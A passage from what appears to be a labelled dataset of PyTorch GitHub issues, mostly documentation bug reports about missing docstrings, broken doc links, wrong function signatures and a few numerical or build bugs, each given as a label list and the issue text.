![image](https://user-images.githubusercontent.com/6421097/80960836-48f53e80-8dcf-11ea-84f6-c0c6b9ba7db2.png) | ![image](https://user-images.githubusercontent.com/6421097/80960775-2105db00-8dcf-11ea-8adc-a5d0b57634ef.png) | \r\n\r\n\r\ncc @ezyang @zou3519"},{"labels":["documentation",null],"text":"The documentation for the out-of-place version of index_add and other similar functions like index_copy appears to be missing the first argument; these functions accept 4 arguments, not 3.\r\n\r\nhttps://github.com/pytorch/pytorch/blob/e26631b33332e7409ac799470b3a4b50b4a8bdc4/torch/_tensor_docs.py#L3550\r\n\r\n\r\n"},{"labels":[null,"documentation",null],"text":"The documentation for _CtxMethodMixin.save_for_backward seems to imply that it accepts only tensor arguments:\r\n\r\nhttps://github.com/pytorch/pytorch/blob/843c0230f2928aad61a6940688da3a6cd6c4cd57/torch/autograd/function.py#L13\r\n\r\n... as does the function name of `saved_tensors`. https://github.com/pytorch/pytorch/blob/843c0230f2928aad61a6940688da3a6cd6c4cd57/torch/autograd/function.py#L386 .   \r\nand this documentation:\r\nhttps://github.com/pytorch/pytorch/blob/843c0230f2928aad61a6940688da3a6cd6c4cd57/torch/autograd/function.py#L161\r\n\r\nBut the documentation here:\r\nhttps://github.com/pytorch/tutorials/blob/f557ee0addc24900929bafd4ceff2fc4c3f47072/beginner_source/examples_autograd/two_layer_net_custom_function.py#L26\r\nindicates that they can be tensors or other types.\r\n\r\nI attempted to read the code (which isn't easy as it involves metaclasses) and as far as I can tell they may be tensors or other types.  I think the documentation should be made consistent on this point.\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":["documentation",null,null,null],"text":"```python\r\nimport torch\r\n\r\nA, B = map(torch.load('bug.pt').get, ['A', 'B'])\r\nprint(A.shape, B.shape) # torch.Size([95, 39]) torch.Size([295, 39])\r\n\r\nD = torch.cdist(A, B)\r\nprint(D[75, 233]) # tensor(0., grad_fn=<SelectBackward>)\r\n\r\nD_ = torch.cdist(A[75].unsqueeze(0), B[233].unsqueeze(0)).squeeze()\r\nprint(D_) # tensor(0.0004, grad_fn=<SqueezeBackward0>)\r\n```\r\nBoth ways should have same precision properties. It is very strange that they return different results: 0.0004 is quite a large difference\r\n\r\n\r\n[bug.pt.gz](https://github.com/pytorch/pytorch/files/4570875/bug.pt.gz)\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nThe link to [PyTorch Governance](https://pytorch.org/docs/source/community/governance.rst) seems to be broken, when accessed from PyTorch Contribution Guide (both on the [master version](https://pytorch.org/docs/master/community/contribution_guide.html#the-pytorch-contribution-process) and the [stable version](https://pytorch.org/docs/stable/community/contribution_guide.html#the-pytorch-contribution-process)).\r\n\r\nThough, when [viewing from Github](https://github.com/pytorch/pytorch/blob/master/docs/source/community/contribution_guide.rst#the-pytorch-contribution-process), it does seem to work. But it leads to the [Github `*.rst` version](https://github.com/pytorch/pytorch/blob/master/docs/source/community/governance.rst).\r\n\r\nIs this a bug or a desired behaviour?"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nPR gh-37419 disabled the tests in `tests/test_doc_coverage.py` as explained in [this comment](https://github.com/pytorch/pytorch/pull/37419#issuecomment-621431059). Rather than delay that PR, this issue was opened to track refactoring those tests."},{"labels":["documentation",null,null],"text":"As #36619 is landed, RRef now exposes three helper functions to run method on the RRef owner. We should update tutorials/examples/docs accordingly to use this feature. \n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=as_strided_&check_keywords=yes&area=default#"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=is_same_size&check_keywords=yes&area=default#\r\n\r\nSeems to be a thing for conveniently testing if sparse sizes actually match. Maybe shouldn't be a method as it is right now."},{"labels":["documentation",null],"text":"I'm not sure this was intentionally put in the torch namespace"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=is_nonzero&check_keywords=yes&area=default#"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=feature_alpha_dropout&check_keywords=yes&area=default#"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=bucketize&check_keywords=yes&area=default#\r\n"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=hardswish&check_keywords=yes&area=default#"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=hardsigmoid&check_keywords=yes&area=default"},{"labels":["documentation",null],"text":"1. Note two commas in function spec\r\n2. It's unclear if default output is `torch.int64` (in practice it is) or `torch.get_default_dtype()` which is usually `torch.float32`. It's unclear what `torch.set_default_tensor_type()` reference has to do with `torch.randint`'s return type since by default it returns an integral tensor\r\n\r\nhttps://pytorch.org/docs/master/torch.html?highlight=torch%20randint#torch.randint\r\n\r\n![image](https://user-images.githubusercontent.com/1041752/80506047-62346000-8975-11ea-99f7-81c7832a1cfb.png)\r\n"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nThe `add_graph` function on SummaryWriter doesn't have documentation\r\n\r\nhttps://pytorch.org/docs/stable/tensorboard.html#torch.utils.tensorboard.writer.SummaryWriter.add_graph\r\n\r\n<img width=\"913\" alt=\"Screen Shot 2020-04-28 at 11 13 26 AM\" src=\"https://user-images.githubusercontent.com/655866/80504712-6cd50200-8941-11ea-94ed-62a5670970c6.png\">"},{"labels":["documentation",null,null],"text":"## ‚ùì Questions\r\n\r\nI want to check the step's compute time and memory of model,  and I find tensorboard in tensorflow can do it. But I run the document in official website (https://pytorch.org/docs/stable/tensorboard.html?highlight=tensorboard), it's not clearly. Could I use it to see network graph's compute time and memory? If yes, how to do it? \r\n\r\n\r\n"},{"labels":["documentation",null,null],"text":"self explanatory"},{"labels":["documentation",null],"text":"`import torch\r\n\r\n### cpu\r\ninput = torch.zeros(8, 3, 7, 10, dtype=torch.float)\r\nsrc = torch.randn(8, 3, 7, 10, dtype=torch.float)\r\nindex = torch.randint(0, 3, [8, 3 ,7, 10])\r\ndim = 1\r\ninput.scatter_(dim, index, src)\r\n\r\n### gpu\r\nginput = torch.zeros(8, 3, 7, 10, dtype=torch.float).cuda()\r\ngsrc = src.cuda()\r\ngindex = index.cuda()\r\nginput.scatter_(dim, gindex, gsrc)\r\n\r\nerr = (ginput.cpu() - input).sum()\r\nprint(err)`\r\n\r\n### result\r\ntensor(3.76)\r\n\r\n### \r\nMy question is why the result is inconsistent? \r\n\r\n\r\n"},{"labels":["documentation",null,null],"text":"Related to this [discussion](https://discuss.pytorch.org/t/how-to-unfold-a-tensor-into-sliding-windows-and-then-fold-it-back/55890), I would like to report a misleading warning in https://github.com/pytorch/pytorch/blob/master/torch/nn/functional.py#L3676. As far as I can see, there is a mismatch between what the inline docs state, i.e. _\"Currently, only 4-D output tensors (batched image-like tensors) are supported\"_ and what is actually allowed in the function (3-D tensors).\r\n\r\nI am reporting this as an issue in the documentation, but maybe this is also worth considering as a bug, since it feels weird that the 'fold' function doesn't accept 4-D tensors. "},{"labels":["documentation",null],"text":"In https://pytorch.org/docs/master/cuda.html#torch.cuda.memory_stats difference between \"active_bytes\" and \"allocated_bytes\"/\"reserved_bytes\" is not explained.\r\n\r\nActive bytes are also not mentioned here: https://pytorch.org/docs/master/notes/cuda.html#cuda-memory-management"},{"labels":["documentation",null],"text":"If you run it from root directory you get message\r\n\r\n```\r\n+ doxygen                                                                \r\nDoxygen version 1.8.14                                                                                                                            \r\nCopyright Dimitri van Heesch 1997-2015                                                                                                            \r\n                                                                                                                                                  \r\nYou can use doxygen in a number of ways:                        \r\n                                                                         \r\n1) Use doxygen to generate a template configuration file:                                                                                         \r\n    doxygen [-s] -g [configName]\r\n\r\n    If - is used for configName doxygen will write to standard output.\r\n\r\n2) Use doxygen to update an old configuration file:\r\n    doxygen [-s] -u [configName]\r\n\r\n3) Use doxygen to generate documentation using an existing configuration file:\r\n    doxygen [configName]\r\n\r\n    If - is used for configName doxygen will read from standard input.\r\n\r\n4) Use doxygen to generate a template file controlling the layout of the\r\n   generated documentation:\r\n    doxygen -l [layoutFileName.xml]\r\n\r\n5) Use doxygen to generate a template style sheet file for RTF, HTML or Latex.\r\n    RTF:        doxygen -w rtf styleSheetFile\r\n    HTML:       doxygen -w html headerFile footerFile styleSheetFile [configFile]\r\n    LaTeX:      doxygen -w latex headerFile footerFile styleSheetFile [configFile]\r\n\r\n6) Use doxygen to generate a rtf extensions file\r\n    RTF:   doxygen -e rtf extensionsFile\r\n\r\nIf -s is specified the comments of the configuration items in the config file will be omitted.\r\nIf configName is omitted `Doxyfile' will be used as a default.\r\n\r\n-v print version string\r\n```\r\n\r\nInspection of the stdout redirect reveals\r\n\r\n```\r\ncat original-doxygen-log.txt \r\nerror: Doxyfile not found and no input file specified!\r\n```"},{"labels":[null,"documentation",null],"text":"Steps to reproduce:\r\n1. Run `docs/cpp/source/check-doxygen.sh` without having doxygen present on your system\r\n\r\nExpected result: error message saying doxygen is not supported\r\n\r\nActual result:\r\n```       \r\n+ popd                                                                                                                                            \r\n~/local/pytorch-tmp                                                                                                                               \r\n+ doxygen                                                                                                                                         \r\n(/home/ezyang/local/pytorch-tmp-env) [ezyang@devvm066.ash0 ~/local/pytorch-tmp]\r\n```"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe LU decomposition returns a tuple containing the 'factorization' and the pivoting order. It would be great to have a mathematical expression how the input relates to these two outputs, especially since the naive assumption (that L is the lower part of the 'factorization' and U is the upper part of the 'factorization') is not true.\r\n\r\n```py\r\nX = torch.rand(3, 3)\r\nLU, piv = torch.lu(X.cuda(), pivot=False) # simple case without pivoting\r\nLU.tril().mm(LU.triu()) # not the same as X\r\n```"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nIt appears that DDP replicates rank 0's parameters to all other devices during DDP model initialization, hence there is no need to set a seed and ensure each process initializes a local model with the same initial parameters, DDP will take care of this. However, this does not appear to de documented anywhere and it appears that https://pytorch.org/tutorials/intermediate/ddp_tutorial.html tells the user to ensure all DDP processes start with the same initial parameter values. If this is no longer necessary, we should update the documentation as such.\r\n\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar"},{"labels":[null,null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\nCurrently when setting `USE_GLOO` cmake option to `ON`, target `gloo_cuda` requires a dependency called `nccl_external`; however, this target is avaliable if and only if `USE_SYSTEM_NCCL` is `OFF`. Thus if both `USE_GLOO` and `USE_SYSTEM_NCCL` is set to `ON` cmake would report error during configuration phase.\r\n\r\nhttps://github.com/pytorch/pytorch/blob/master/cmake/Dependencies.cmake#L1149\r\nhttps://github.com/pytorch/pytorch/blob/master/cmake/External/nccl.cmake#L19\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. run `cmake -DBUILD_PYTHON=OFF -DUSE_CUDA=ON -DUSE_CUDNN=ON -DUSE_NCCL=ON -DUSE_SYSTEM_NCCL=ON -DUSE_DISTRIBUTED=ON -DUSE_GLOO=ON /path/to/torchsrc`\r\n\r\n2. CMake will then report the following error:\r\n    ```\r\n    -- Configuring done\r\n    CMake Error at cmake/Dependencies.cmake:1149 (add_dependencies):\r\n      The dependency target \"nccl_external\" of target \"gloo_cuda\" does not exist.\r\n    Call Stack (most recent call first):\r\n      CMakeLists.txt:421 (include)\r\n\r\n\r\n    -- Generating done\r\n    CMake Generate step failed.  Build files cannot be regenerated correctly.\r\n    ```\r\n\r\n## Expected behavior\r\n\r\nThe configuration step should be executed without problem\r\n\r\n## Environment\r\n\r\n* OS: CentOS 7 x86_64 with `devtoolset-6` enabled\r\n* CMake version: 3.17.0\r\n* Cuda version: 9.2.148-1\r\n* CuDNN version: libcudnn7-7.6.5.31-1.cuda9.2\r\n* NCCL version: 2.4.8-ga-cuda9.2-1-1\r\n\r\nAll of Cuda, CuDNN and NCCL libraries are installed through NVIDIA's offical rpm package; no libtorch were installed before.\r\n\r\nI've tried using current master HEAD and tag/v1.5.0-rc3 and the problem still exists.\r\n\r\n## Additional context\r\n\r\nRelated commit seems to be https://github.com/pytorch/pytorch/commit/30da84fbe1614138d6d9968c1475cb7dc459cd4b\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar"},{"labels":["documentation",null,null],"text":"https://pytorch.org/docs/master/nn.functional.html?highlight=softmax#torch.nn.functional.softmax\r\n\r\nIf it's unused or has some special undocumented meaning, I think it's useful to explain it explicitly in Parameters section"},{"labels":["documentation",null,null],"text":"cc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a @iseeyuan \r\n\r\nThey were added in https://github.com/pytorch/pytorch/pull/33294 and the PR says \"The \"_\" prefix registration will be removed when the operators are all migrated to mobile.\" This should be reflected in the code somewhere."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe documentation for the `add_scalars()` method for a `SummaryWriter` instance states the following note:\r\n>  Note that this function also keeps logged scalars in memory. In extreme case it explodes your RAM.\r\n\r\nRef: https://pytorch.org/docs/stable/tensorboard.html#torch.utils.tensorboard.writer.SummaryWriter.add_scalars\r\n\r\nI believe that this is incorrect. This **is** an issue with the original tensorboardX implementation that adds scalars to a `self.scalar_dict` instance variable, but this has already been stripped out in the pytorch implementation as mentioned by @orionr here: https://github.com/pytorch/pytorch/issues/21089#issuecomment-521449014\r\n\r\nMore details on the issue in the original tensorboardX issue (which should not impact the pytorch implementation) can be read here: https://github.com/lanpa/tensorboardX/issues/204#issuecomment-612724297"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nHi all,\r\n      I found the LPPool2d & LPPool1d in the pytorch implementation, but there is no reference provided in the documents. And I didn't find the related paper explaining why it works. Any related paper would be helpful, thanks!"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nhttps://pytorch.org/docs/stable/distributed.html#launch-utility does not include the full documentation from https://github.com/pytorch/pytorch/blob/f326045/torch/distributed/launch.py#L4-L140. An earlier version of the docs at https://pytorch.org/docs/1.1.0/distributed_deprecated.html#launch-utility does not have this issue."},{"labels":[null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\nStandard arithmetic operations with `dtype==torch.half` are broken.\r\n\r\n## To Reproduce\r\n\r\n```python\r\nimport torch\r\n\r\nx = torch.tensor(1.0, dtype=torch.half)\r\n\r\nx + 1.0\r\nx - 1.0\r\nx * 1.0\r\nx / 1.0\r\n```\r\n\r\n```\r\nRuntimeError: \"add_cpu/sub_cpu\" not implemented for 'Half'\r\nRuntimeError: \"mul_cpu\" not implemented for 'Half'\r\nRuntimeError: \"div_cpu\" not implemented for 'Half'\r\n```\r\n## Environment\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.6.0a0+3d199aa\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.2\r\n\r\nOS: Ubuntu 18.04.4 LTS\r\nGCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0\r\nCMake version: version 3.17.0\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.2.89\r\nGPU models and configuration: GPU 0: GeForce GTX 1080\r\nNvidia driver version: 440.33.01\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.2\r\n[pip3] torch==1.6.0a0+3d199aa\r\n[pip3] torchvision==0.6.0a0+684f48d\r\n[conda] Could not collect\r\n```\r\n\r\nBuild from source a few hours ago.\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null],"text":"It should say `x_2^T` if I'm not mistaken: https://github.com/pytorch/pytorch/commit/883628cb5c31c89323cef52e96310c92abecfcbe#r38390009"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\nConcern about MultiLabelSoftMarginLoss, I think there is still a problem with its doc.\r\nAs @DNGros pointed out, there is a lot of confusion when using MultiLabelMarginLoss and MultiLabelSoftMarginLoss, and he improved the docs. #15863\r\nHowever, for the docs of MultiLabelSoftMarginLoss it's still not correct.\r\nSince if you set the label as the docs\r\n> Target: (N, C)(N,C) , label targets padded by -1 ensuring same shape as the input.\r\n\r\npad it like [0,3,-1,-1], the result will be wrong.\r\nIf we look at the equation\r\n![image](https://user-images.githubusercontent.com/23011317/78770175-cf7d5280-79c0-11ea-85ec-5e7122cd5480.png)\r\nwe will find it, in fact, write clearly that label y need to be 0 or 1.\r\nIf we feed the -1 padded label, the loss actually sometimes will become negative number, and this is shown by my experiment.\r\n\r\nSo I think the right Target format for MultiLabelSoftMarginLoss is just one_hot vector.\r\nAnd we can give a good example code as MultiLabelMarginLoss has."},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nSee https://pytorch.org/docs/master/jit.html#disable-jit-for-debugging\r\n\r\n![image](https://user-images.githubusercontent.com/24860335/78762631-f42de780-7938-11ea-955e-6992e10bcc2a.png)\r\n\n\ncc @suo"},{"labels":["documentation",null,null],"text":"Which optimizer is recommended to be used with OneCycleLr? The docs suggest SGD. Is that because the scheduler only has real effect with a bare-bones optimizer?\n\ncc @vincentqb"},{"labels":["documentation",null,null],"text":"As shown in the image below, a section on the static post training quantization workflow is a numbered list with a sub-list that should be presented in list format but appears instead in paragraph form. Not a big deal but would be easier to understand if it appeared more clearly as distinct items. \r\n\r\n\r\n<img width=\"1212\" alt=\"nits-on-quant-doc-20200406\" src=\"https://user-images.githubusercontent.com/45861273/78610335-77581c00-7819-11ea-86ba-ebe20e51945b.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":["documentation",null,null],"text":"These functions don't seem to have docstrings associated with them. I noticed this after moving them to c10 dispatch and aliasing the names in the `torch` namespace to those.\r\n\r\nCurrently added to the whitelist in `test_docs_coverage.py`\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\nSome tutorials cannot be accessed via Tutorial Home Page or PyTorch Tutorial side panel. Their links are missing. To access these tutorials, I search Google\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Go to https://pytorch.org/tutorials/\r\n1. These tutorials are not found in both side panel, and in the welcome page:\r\n   1. \"WRITING CUSTOM DATASETS, DATALOADERS AND TRANSFORMS.\r\n   Link: https://pytorch.org/tutorials/beginner/data_loading_tutorial.html\r\n   1. WORD EMBEDDINGS: ENCODING LEXICAL SEMANTICS\r\n   Link: https://pytorch.org/tutorials/beginner/nlp/word_embeddings_tutorial.html\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0):\r\n - OS (e.g., Linux):\r\n - How you installed PyTorch (`conda`, `pip`, source):\r\n - Build command you used (if compiling from source):\r\n - Python version:\r\n - CUDA/cuDNN version:\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nSee https://pytorch.org/docs/master/nn.html#avgpool2d, parameters\r\n\r\n\"attr:kernel_size\" is showing up for divisor_override instead of highlighted `kernel_size`. \r\n\r\n![image](https://user-images.githubusercontent.com/24860335/78205638-845bc080-7451-11ea-8e12-b02fc28365dd.png)\r\n\r\nAlso incorrect for AvgPool3d. \r\n\r\nAlso https://pytorch.org/docs/master/distributions.html#torch.distributions.laplace.Laplace. \r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nUnder [installing new versions](https://pytorch.org/get-started/previous-versions/), more precisely:\r\n-  v1.2.0 \r\n- cuda 10.0\r\n- using pip\r\n- for linux & windows\r\n\r\nthe docs give this line\r\n\r\n```\r\n# CUDA 10.0\r\npip install torch==1.2.0 torchvision==0.4.0 -f https://download.pytorch.org/whl/torch_stable.html\r\n\r\n```\r\nIt seems that this line grabs the cuda 9.2 version instead:\r\n```\r\nCollecting torch==1.2.0\r\n  Downloading https://download.pytorch.org/whl/cu92/torch-1.2.0%2Bcu92-cp27-cp27mu-manylinux1_x86_64.whl (663.1MB)\r\n```\r\nProbably the docs need to be updated?\r\n"},{"labels":[null,"documentation",null,null],"text":"For now, RPC could either send tensor data or tensor **storage** data to the destination depending on the sparsity of the tensor. Say, if the tensor is just a view of the 1st row of another tensor that contains 100 rows, RPC would clone the tensor and just send the data in the 1st row. If, however, if the tensor is a view of the first 60 rows, RPC would send the entire storage. This is an internal optimization to balance memory overhead vs comm overhead. As @lw pointed out in [this comment](https://github.com/pytorch/pytorch/pull/35483#discussion_r400196335), this will have user-visible differences and it's important that we have a clear design on this behavior and clarify that in our API docs. \n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\ntorch::cat is missing documentation? Following this link, where I searched for the documentation only returned other functions where torch::cat are begin used in the body?\r\n\r\nhttps://pytorch.org/cppdocs/search.html?q=torch%3A%3Acat&check_keywords=yes&area=default\r\n"},{"labels":[null,null,"documentation",null,null],"text":"Motivating PR: https://github.com/pytorch/pytorch/pull/33596\r\n\r\n@albanD @ezyang Should we have a separate docs page (at least) about fp16 quirks, given that new built-in autocast support has been merged? Another related issue: https://github.com/pytorch/pytorch/pull/35594\r\n\r\nIt would also be nice to discuss some global hooks that can replace inf/nan in output/grad by zero, especially when a third-party library is used under the hood that doesn't allow to swap epsilons easily (or some epsilon factory, but that's more complicated).\r\nTwo related issues: https://github.com/pytorch/pytorch/issues/31829 https://github.com/pytorch/pytorch/issues/31557\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\nIs there a reason that `torch.isclose()` is undocumented or should it be added?\r\n"},{"labels":["documentation",null,null],"text":"## üêõ Bug\r\n\r\nWhen doing einsum with the equation `'abcdefghijklmnopt,qrsp,qrso,qrsn,qrsm,qrsl,qrsk,qrsj,qrsi,qrsh,qrsg,qrsf,qrse,qrsd,qrsc,qrsb,qrsa->qrst'`, if I move the `abcdefghijklmnopt` argument to the front, pytorch allocates a significantly different amount of memory.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Run the following script\r\n```python\r\nimport torch\r\nbig_core = torch.randn(\r\n    2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2,\r\n    dtype=torch.float64, device=\"cuda\", requires_grad=True\r\n)\r\nbatches_of_small_cores = [\r\n    torch.randn(8, 25, 25, 2, dtype=torch.float64, device=\"cuda\", requires_grad=True)\r\n    for _ in range(16)\r\n]\r\n\r\nresult = torch.einsum(\r\n    'qrsp,qrso,qrsn,qrsm,qrsl,qrsk,qrsj,qrsi,qrsh,qrsg,qrsf,qrse,qrsd,qrsc,qrsb,qrsa,abcdefghijklmnopt->qrst', *batches_of_small_cores, big_core\r\n)\r\n\r\npeak_allocated_GiB = torch.cuda.memory_stats()[\"allocated_bytes.all.peak\"] / 1024 / 1024 / 1024\r\nprint(peak_allocated_GiB)\r\ntotal_allocated_GiB = torch.cuda.memory_stats()[\"allocated_bytes.all.allocated\"] / 1024 / 1024 / 1024\r\nprint(total_allocated_GiB)\r\n# peak allocated GiB: 4.9                                                                                                                                                                            \r\n# total allocated GiB: 4.9\r\n```\r\n2. Run the following script, which differs only in `einsum` arguments order.\r\n```python\r\nimport torch\r\nbig_core = torch.randn(\r\n    2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2,\r\n    dtype=torch.float64, device=\"cuda\", requires_grad=True\r\n)\r\nbatches_of_small_cores = [\r\n    torch.randn(8, 25, 25, 2, dtype=torch.float64, device=\"cuda\", requires_grad=True)\r\n    for _ in range(16)\r\n]\r\n\r\nresult = torch.einsum(\r\n    'abcdefghijklmnopt,qrsp,qrso,qrsn,qrsm,qrsl,qrsk,qrsj,qrsi,qrsh,qrsg,qrsf,qrse,qrsd,qrsc,qrsb,qrsa->qrst', big_core, *batches_of_small_cores\r\n)\r\n\r\n\r\npeak_allocated_GiB = torch.cuda.memory_stats()[\"allocated_bytes.all.peak\"] / 1024 / 1024 / 1024\r\nprint(peak_allocated_GiB)\r\ntotal_allocated_GiB = torch.cuda.memory_stats()[\"allocated_bytes.all.allocated\"] / 1024 / 1024 / 1024\r\nprint(total_allocated_GiB)\r\n# peak allocated GiB: 6.1                                                                                                                                                                            \r\n# total allocated GiB: 7.3\r\n```\r\n3. Notice that the amount of allocated memory is significantly different.\r\n\r\n## Expected behavior\r\n\r\nI expected the second script to allocate the same amount of memory as the first script.\r\n\r\n## Environment\r\n\r\n* PyTorch version: 1.4.0\r\n* Is debug build: No\r\n* CUDA used to build PyTorch: 10.1\r\n* OS: Debian GNU/Linux 10 (buster)\r\n* GCC version: (Debian 8.3.0-6) 8.3.0\r\n* CMake version: version 3.13.4\r\n* Python version: 3.8\r\n* Is CUDA available: Yes\r\nCUDA runtime version: 9.2.148\r\n* GPU models and configuration: \r\n* GPU 0: Graphics Device\r\n* GPU 1: GeForce GTX 1070\r\n* Nvidia driver version: 418.74\r\n* cuDNN version: Could not collect\r\n* Versions of relevant libraries:\r\n* [pip3] numpy==1.16.2\r\n* [conda] mkl                       2020.0                      166  \r\n* [conda] pytorch                   1.4.0           py3.8_cuda10.1.243_cudnn7.6.3_0    pytorch\r\n* [conda] torchvision               0.5.0                py38_cu101    pytorch\r\n"},{"labels":["documentation",null,null],"text":"with [1.4 stable](https://pytorch.org/docs/stable/torch.html#torch.max), both max and min are broken\r\n\r\n<img width=\"880\" alt=\"Screen Shot 2020-03-23 at 1 10 07 PM\" src=\"https://user-images.githubusercontent.com/16999635/77343167-a776c980-6d07-11ea-9f1a-1e4621228f18.png\">\r\n\r\non [master](https://pytorch.org/docs/master/torch.html#torch.min), min is broken\r\n\r\n<img width=\"875\" alt=\"Screen Shot 2020-03-23 at 1 13 23 PM\" src=\"https://user-images.githubusercontent.com/16999635/77343563-413e7680-6d08-11ea-8042-faaa845d90bc.png\">\r\n\r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\nWhen I use function `torch::randint()` it takes arguments `int64_t high, at::IntArrayRef size, at::TensorOptions &options = {}` however, at the documentation it says there should also be a `at::Generator generator`\r\n\r\nhttps://pytorch.org/cppdocs/api/function_namespacetorch_1ad86f0f5e4b92098660b54e584342a188.html?highlight=randint\r\n\r\nI am using libtorch 1.4\n\ncc @yf225"},{"labels":[null,"documentation",null],"text":"The current documentation of `torch.autograd.functional` follows that same practice as other places: create random Tensors and print them.\r\nWe could improve that by:\r\n- Use hard coded values to make them more readable and easily reproducible\r\n- Find a way to test that the docstring example stays up to date with what the function does?\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe old build variables NO_CUDA and NO_DISTRIBUTED are referenced in CONTRIBUTING.md\r\n\r\n"},{"labels":[null,"documentation",null,null,null],"text":"NumPy has utilities that allow to create an array from a ctypes pointer in pure Python (without C++ extensions):\r\n- https://docs.scipy.org/doc/numpy/reference/routines.ctypeslib.html#module-numpy.ctypeslib\r\n- https://docs.scipy.org/doc/numpy/reference/generated/numpy.ndarray.ctypes.html\r\n\r\nIn C++ land, it seems that [`torch::from_blob`](https://pytorch.org/cppdocs/api/function_namespacetorch_1ad7fb2a7759ef8c9443b489ddde494787.html#function-documentation) should do the trick, but it has no binding to Python.\r\n\r\nI propose to have utilities that would allow to do without passing by NumPy first or creating a C++ extension for a single-function `torch::from_blob` call, i.e. Python binding for `torch::from_blob` (that exist in java bindings btw), potentially with a custom deleter.\r\n\r\nContext: I'd like to make a very thin ffmpeg audio-reading wrapper: the C code would do that allocation, return it to calling code, and the calling code would be responsible to free that memory. Pseudocode for NumPy (I still need to fix the C code) is here: https://github.com/vadimkantorov/audioprimer/blob/master/decode_audio.py . Ideally I'll have a single C file that's independent of NumPy/Torch and just slightly different versions of interfacing with it. I can think of some alternatives for this particular case, but Python way of creating a tensor from a raw ctypes pointer still may be useful for existing ctypes codebases."},{"labels":["documentation",null,null],"text":"## üìö 